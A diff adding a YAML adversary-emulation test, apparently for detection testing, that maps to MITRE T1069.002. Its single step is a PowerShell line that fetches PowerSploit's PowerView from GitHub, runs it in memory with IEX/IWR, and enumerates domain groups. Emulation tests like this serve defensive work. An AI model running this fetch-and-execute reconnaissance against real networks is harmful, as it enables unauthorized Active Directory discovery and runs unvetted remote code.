@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Get-DomainGroup with PowerView
+description: |
+    Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.
+uuid: 5a8a181c-2c8e-478d-a943-549305a01230
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1069: Permission Groups Discovery'
+    subtechniques:
+        - 'T1069.002: Domain Groups'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: get-domaingroup-with-powerview
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
